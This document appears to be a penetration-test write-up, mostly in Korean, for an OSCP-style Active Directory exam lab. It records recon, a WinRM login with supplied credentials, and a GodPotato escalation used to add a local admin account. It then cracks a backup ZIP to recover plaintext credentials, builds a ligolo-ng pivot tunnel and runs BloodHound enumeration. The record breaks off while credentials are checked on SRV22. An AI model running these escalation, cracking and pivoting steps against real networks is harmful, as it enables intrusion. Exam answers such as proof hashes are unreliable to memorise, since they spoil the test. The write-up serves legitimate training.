Target IP: 172.16.91.200
--------------------------------------

Maximum Potential Points: 40

You have agreed with the client to perform an assumed breach scenario penetration test against their Microsoft Windows Active Directory infrastructure. You can use the credential below to have access to the WS26 client machine in oscp.exam domain.

Username: r.andrews
Password: BusyOfficeWorker890

The final objective of the Active Directory penetration test is to gain Domain Administrator level rights on the network. The Active Directory network can be located at the following IP addresses:


172.16.91.200
172.16.91.202
192.168.91.206

Main Objectives:

- Get Administrative interactive access to the WS26 client machine and obtain proof.txt file in a valid way, note that there is no local.txt file.
- Get Administrative interactive access to the SRV22 client machine and obtain proof.txt files in a valid way, note that there is no local.txt file.
- Get Administrative interactive access to the Domain Controller (DC20) and obtain the proof.txt file in a valid way, note that there is no local.txt file.
- Submit proof.txt files in the Control Panel.

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of proof.txt and the machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found in performed attacks and exploitation processes. You must show all steps executed against the entire Active Directory domain used to obtain Domain Administrator privileges. 

IMPORTANT NOTE: Reverting a single machine is not possible; reverting any AD set machine will revert the entire AD network. Please wait 5 minutes after reverting to ensure all services are operational. The full revert process may take 5-7 minutes.

Please note that not all machines will respond to ICMP/ping requests.

There are no dependencies between the Active Directory set and the stand alone machines.





## Nmap


| TCP | 135, 139, 445, 3389, 5985 |
| --- | ------------------------- |
| UDP |                           |



```bash

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nnmap 192.168.91.206                                                   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 07:25 +0900
Nmap scan report for WS26.oscp.exam (192.168.91.206)
Host is up (0.19s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Not valid before: 2024-11-12T11:04:26
|_Not valid after:  2025-05-14T11:04:26
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22621
|_  System_Time: 2024-11-13T11:22:53+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=3/21%Time=69BDC98C%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 11 21H2 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-13T11:22:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -492d11h03m41s, deviation: 0s, median: -492d11h03m41s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   189.80 ms 192.168.49.1
2   189.83 ms WS26.oscp.exam (192.168.91.206)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.81 seconds


```



host 정보 수집
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nxc smb 192.168.91.206 --generate-hosts-file hosts                
SMB         192.168.91.206  445    WS26             [*] Windows 11 Build 22621 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:False) 
```

hosts 파일 설정
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouter
192.168.91.206     WS26.oscp.exam WS26

```

주어진 자격증명 사용

```
Username: r.andrews
Password: BusyOfficeWorker890
```

자격증명 유효성 확인
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ netexec smb WS26.oscp.exam -u r.andrews -p BusyOfficeWorker890 
SMB         192.168.91.206  445    WS26             [*] Windows 11 Build 22621 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:False)                                                                                       
SMB         192.168.91.206  445    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 

┌──(kali㉿kali)-[~/OSCP/git/nc.exe]
└─$ netexec winrm WS26.OSCP.EXAM -u r.andrews -p BusyOfficeWorker890
WINRM       192.168.91.206  5985   WS26             [*] Windows 11 Build 22621 (name:WS26) (domain:oscp.exam)
WINRM       192.168.91.206  5985   WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)

```



SMB 공유폴더 리스트 확인
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nxc smb 192.168.91.206 -u 'r.andrews' -p 'BusyOfficeWorker890' --shares
SMB         192.168.91.206  445    WS26             [*] Windows 11 Build 22621 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:False)                                                                                       
SMB         192.168.91.206  445    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 
SMB         192.168.91.206  445    WS26             [*] Enumerated shares
SMB         192.168.91.206  445    WS26             Share           Permissions     Remark
SMB         192.168.91.206  445    WS26             -----           -----------     ------
SMB         192.168.91.206  445    WS26             ADMIN$                          Remote Admin
SMB         192.168.91.206  445    WS26             C$                              Default share
SMB         192.168.91.206  445    WS26             IPC$            READ            Remote IPC

```

evil-winrm 인증 성공 및 권한 확인
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ evil-winrm -i 192.168.91.206 -u 'r.andrews' -p 'BusyOfficeWorker890'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\r.andrews\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled


```






`r.andrews` 계정 권한 확인
```powershell
*Evil-WinRM* PS C:\Users\r.andrews\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
*Evil-WinRM* PS C:\Users\r.andrews\Documents> upload PrintSpoofer64.exe

```

`GodPotato-NET4.exe` 업로드
```powershell
*Evil-WinRM* PS C:\users\r.andrews\Documents> upload GodPotato-NET4.exe
                                        
Info: Uploading /home/kali/OSCP_EXAM/192.168.91.206/GodPotato-NET4.exe to C:\users\r.andrews\Documents\GodPotato-NET4.exe                                                                                                                                                                                          
                                        
Data: 76456 bytes of 76456 bytes copied
                                        
Info: Upload successful!

```
![[Pasted image 20260321095845.png]]


`4leaf` 유저 생성
```powershell
*Evil-WinRM* PS C:\users\r.andrews\Documents> .\GodPotato-NET4.exe -cmd "net user 4leaf a123a123!@ /add"
[*] CombaseModule: 0x140732601794560
[*] DispatchTable: 0x140732604465616
[*] UseProtseqFunction: 0x140732603736912
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\a6562e9a-0539-44b1-8055-8dcf576353c1\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007002-1168-ffff-cd12-76b12fb84e54
[*] DCOM obj OXID: 0x71bd9728dc08ec3d
[*] DCOM obj OID: 0x407449632a13887
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 992 Token:0x736  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3996
The command completed successfully.
```

![[Pasted image 20260321095821.png]]

생성한 `4leaf ` Administrators 그룹 추가
```powershell
*Evil-WinRM* PS C:\users\r.andrews\Documents> .\GodPotato-NET4.exe -cmd "net localgroup administrators 4leaf /add"
[*] CombaseModule: 0x140732601794560
[*] DispatchTable: 0x140732604465616
[*] UseProtseqFunction: 0x140732603736912
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\6d315c6f-d65d-409a-91a5-0aefda0ec2f1\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009002-1648-ffff-ac68-99998f59d834
[*] DCOM obj OXID: 0x139c7e41cd337350
[*] DCOM obj OID: 0xa1197ece4c245ad8
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 992 Token:0x736  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5384
The command completed successfully.


```
![[Pasted image 20260321100034.png]]

`4leaf` 로 evil-winrm 접속 후 proof.txt 획득

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
6b435d188965297b3aa0e032170bc208
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.91.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.91.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.91.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

```

![[Pasted image 20260321100437.png]]





## Post-Exploitation
주어진 자격증명인 r.andrews를 administrators 에 추가하였습니다.
```powershell
*Evil-WinRM* PS C:\Users\4leaf\Documents> net localgroup Administrators r.andrews /add
The command completed successfully.

```

![[Pasted image 20260321105138.png]]

Adminitrator 폴더에서 backup 파일 발견하여 다운로드
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/9/2024   1:11 PM                WindowsPowerShell
-a----         10/9/2024  12:47 PM           3694 backup.zip


*Evil-WinRM* PS C:\Users\Administrator\Documents> download backup.zip
                                        
Info: Downloading C:\Users\Administrator\Documents\backup.zip to backup.zip
                                        
Info: Download successful!

```

![[Pasted image 20260321111515.png]]

다운받은 zip파일에 패스워드가 필요하여 hash 파일 생성
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ zip2john backup.zip > backup.hash                                       
ver 2.0 efh 5455 efh 7875 backup.zip/backup/cafeteria.xml PKZIP Encr: TS_chk, cmplen=359, decmplen=979, crc=2CC50C29 ts=2C98 cs=2c98 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/medical-plants.xml PKZIP Encr: TS_chk, cmplen=1168, decmplen=6681, crc=812CFCCD ts=2C98 cs=2c98 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/nurses.csv PKZIP Encr: TS_chk, cmplen=244, decmplen=426, crc=00255DE5 ts=2C98 cs=2c98 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/pharmacy.xml PKZIP Encr: TS_chk, cmplen=260, decmplen=627, crc=239152ED ts=2C98 cs=2c98 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/web.config PKZIP Encr: TS_chk, cmplen=725, decmplen=2061, crc=29D11043 ts=765B cs=765b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

```
![[Pasted image 20260321111640.png]]




john 사용하여 패스워드 획득 `myspace1`
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash            
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace1         (backup.zip)     
1g 0:00:00:00 DONE (2026-03-21 11:16) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

![[Pasted image 20260321111654.png]]

backup 파일 압축 해제 
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ 7z x backup.zip     

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3694 bytes (4 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 3694

    
Enter password (will not be echoed):
Everything is Ok

Files: 5
Size:       10774
Compressed: 3694


```

![[Pasted image 20260321111748.png]]

자격증명 획득 `b.martin / MartiniAllNight222`
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/backup]
└─$ grep -ri 'passw'                                      
web.config:    <add key="ApiPassword" value="MartiniAllNight222" /> 
                                                                                                                   
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/backup]
└─$ cat web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModule" resourceType="Unspecified" />
    </handlers>
    <aspNetCore processPath="dotnet" arguments=".\Microsoft.IIS.Administration.dll" forwardWindowsAuthToken="true" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" />
    <appSettings>
    <add key="ApiURL" value="https://...../servlets/AssetServlet" />
    <add key="ApiUserName" value="b.martin" />
    <add key="ApiPassword" value="MartiniAllNight222" /> 
    <security>
      <authentication>
        <windowsAuthentication enabled="true" />
      </authentication>
      <authorization>
        <clear />
        <add accessType="Allow" roles="Administrators,IIS Administrators" />
      </authorization>
    </security>
  </system.webServer>
  <!-- 
       ALWAYS PROTECTED SECURITY AREA 
       THE HOST MUST PROVIDE AUTHENTICATION
       
       [Windows Authentication]
       [Client Certificate Authentication]
  -->
  <location path="security">
    <system.webServer>
      <security>
        <authentication>
          <anonymousAuthentication enabled="false" />
          <windowsAuthentication enabled="true" />
        </authentication>
        <authorization>
          <clear />
          <add accessType="Deny" users="?" />
          <add accessType="Allow" roles="Administrators,IIS Administrators" />
        </authorization>
      </security>
    </system.webServer>
  </location>
  <!-- 
      API area 
      Protected by ACCESS TOKEN
      The host can provide additional authentication on top
  -->
  <location path="api">
    <system.webServer>
      <security>
        <authentication>
          <!-- Need for CORs -->
          <anonymousAuthentication enabled="true" />
        </authentication>
        <authorization>
          <!-- Need for CORs -->
          <add accessType="Allow" verbs="OPTIONS" users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>

```


![[Pasted image 20260321111928.png]]




























라우트 정보 확인
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> route print
===========================================================================
Interface List
 12...00 50 56 8a e7 91 ......vmxnet3 Ethernet Adapter
  3...00 50 56 8a 7b c4 ......Intel(R) 82574L Gigabit Network Connection
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   192.168.91.254   192.168.91.206     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
      172.16.91.0    255.255.255.0         On-link     172.16.91.206    281
    172.16.91.206  255.255.255.255         On-link     172.16.91.206    281
    172.16.91.255  255.255.255.255         On-link     172.16.91.206    281
     192.168.91.0    255.255.255.0         On-link    192.168.91.206    271
   192.168.91.206  255.255.255.255         On-link    192.168.91.206    271
   192.168.91.255  255.255.255.255         On-link    192.168.91.206    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.91.206    271
        224.0.0.0        240.0.0.0         On-link     172.16.91.206    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.91.206    271
  255.255.255.255  255.255.255.255         On-link     172.16.91.206    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   192.168.91.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

![[Pasted image 20260321100715.png]]

내부 네트워크로의 피벗팅을  원활하게 하기위해 ligolo-ng 터널을 구축

`agent.exe` 파일 업로드
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload agent.exe
                                        
Info: Uploading /home/kali/OSCP_EXAM/192.168.91.206/agent.exe to C:\Users\Administrator\Desktop\agent.exe
                                        
Data: 8925864 bytes of 8925864 bytes copied
                                        
Info: Upload successful!


```
![[Pasted image 20260321101718.png]]

```powershell
┌──(kali㉿kali)-[~/OSCP/git/ligolo]
└─$ sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                   
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                   
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                    
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                     
        /____/                          /____/                                                                      
                                                                                                                    
  Made in France ♥            by @Nicocha30!                                                                        
  Version: 0.8.2                                                                                                    
                                                                                                                    
ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
INFO[0006] Agent joined.                                 id=0050568ae791 name="WS26\\4leaf@WS26" remote="192.168.91.206:60154"
ligolo-ng » session
? Specify a session : 1 - WS26\4leaf@WS26 - 192.168.91.206:60154 - 0050568ae791
[Agent : WS26\4leaf@WS26] » ifcreate 172.16.91.0
error: invalid usage of command 'interface_create' (unconsumed input '172.16.91.0'), try 'help'
[Agent : WS26\4leaf@WS26] » ifcreate --name 172.16.91.0
INFO[0029] Creating a new 172.16.91.0 interface...      
INFO[0029] Interface created!                           
[Agent : WS26\4leaf@WS26] » route_add --name 172.16.91.0 --route 172.16.91.0/24
INFO[0047] Route created.                               
[Agent : WS26\4leaf@WS26] » start --tun 172.16.91.0
INFO[0060] Starting tunnel to WS26\4leaf@WS26 (0050568ae791) 

```
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> .\agent.exe -connect 192.168.49.91:11601 -ignore-cert
agent.exe : time="2024-11-13T06:19:12-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2024-11-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2024-11-13T06:19:12-08:00" level=info msg="Connection established" addr="192.168.49.91:11601"

```


## 172.16.91.200
### Nmap
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 172.16.91.200 -oN 172.16.91.200.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 10:35 +0900
Nmap scan report for 172.16.91.200
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc?
139/tcp  open  netbios-ssn?
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port139-TCP:V=7.98%I=7%D=3/21%Time=69BDF5F2%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Cisco 3500 XL switch (86%), Cisco SG 300-10, Dell PowerConnect 2748, Linksys SLM2024, SLM2048, or SLM224P, or Netgear FS728TP or GS724TP switch (86%), Dell PowerConnect 5316M switch (86%), Linksys SRW2000-series or Allied Telesyn AT-8000S switch (86%), Linksys SRW2024 switch (86%), Netgear FS700TS Smart Switch (86%), IBM OS/400 V4R3 (85%), Cisco SG 500 switch (85%), OpenBSD 3.6 (x86) (85%), OpenBSD 4.0 (x86) (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC20, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:af:78 (VMware)
| smb2-time: 
|   date: 2026-03-21T01:36:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT       ADDRESS
1   172.07 ms 172.16.91.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.96 seconds

```


```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nmap -p- -sU --min-rate 5000 172.16.91.200                              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 10:42 +0900
Nmap scan report for 172.16.91.200
Host is up (0.016s latency).
All 65535 scanned ports on 172.16.91.200 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds
                                                            
```

![[Pasted image 20260321103818.png]]

hosts 파일 세팅
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nxc smb 172.16.91.200 --generate-hosts-file hosts 
SMB         172.16.91.200   445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ cat hosts
192.168.91.206     WS26.oscp.exam WS26
172.16.91.202     SRV22.oscp.exam SRV22
172.16.91.200     DC20.oscp.exam oscp.exam DC20
                                                                                                                   
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ sudo vi /etc/hosts         
                                                                                                                   
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouter
192.168.91.111     OSCP.oscp OSCP
192.168.91.206     WS26.oscp.exam WS26

```
![[Pasted image 20260321113929.png]]


자격증명 확인
```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb 172.16.91.200 -u 'r.andrews' -p 'BusyOfficeWorker890'                               
SMB         172.16.91.200   445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         172.16.91.200   445    DC20             [+] oscp.exam\r.andrews:BusyOfficeWorker890 

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/backup]
└─$ nxc smb 172.16.91.200 -u 'b.martin' -p 'MartiniAllNight222'                                 
SMB         172.16.91.200   445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         172.16.91.200   445    DC20             [+] oscp.exam\b.martin:MartiniAllNight222 


```


![[Pasted image 20260321110713.png]]

![[Pasted image 20260321112159.png]]


bloodhound 정보수집
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ bloodhound-python -d 'oscp.exam' -u 'r.andrews' -p 'BusyOfficeWorker890' -c All -ns 172.16.91.200 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: oscp.exam
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc20.oscp.exam
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc20.oscp.exam
INFO: Found 28 users
INFO: Found 62 groups
INFO: Found 8 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS26.oscp.exam
INFO: Querying computer: SRV22.oscp.exam
INFO: Querying computer: DC20.oscp.exam
INFO: Done in 00M 39S
INFO: Compressing output into 20260321130326_bloodhound.zip

```

![[Pasted image 20260321131208.png]]

`20260321130326_users.json` 에서 유저명 열거



![[Pasted image 20260322034331.png]]



 Group: Administrators 

OSCP\c.rogers
OSCP\Domain Admins
SRV22\Administrator
































## 172.16.91.202

### Nmap
```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 172.16.91.202 -oN 172.16.91.202.log

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 10:35 +0900
Nmap scan report for 172.16.91.202
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-21T01:36:38
|_  start_date: N/A

TRACEROUTE
HOP RTT       ADDRESS
1   144.91 ms 172.16.91.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.14 seconds

```

```bash
┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206]
└─$ nmap -p- -sU --min-rate 5000 172.16.91.202
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 10:42 +0900
Nmap scan report for 172.16.91.202
Host is up (0.0079s latency).
All 65535 scanned ports on 172.16.91.202 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
                                                                        
```
![[Pasted image 20260321104004.png]]

자격증명 확인
```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb 172.16.91.202 -u 'r.andrews' -p 'BusyOfficeWorker890'
SMB         172.16.91.202   445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.91.202   445    SRV22            [+] oscp.exam\r.andrews:BusyOfficeWorker890 

┌──(kali㉿kali)-[~/OSCP_EXAM/192.168.91.206/backup]
└─$ nxc smb 172.16.91.202 -u 'b.martin' -p 'MartiniAllNight222'
SMB         172.16.91.202   445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
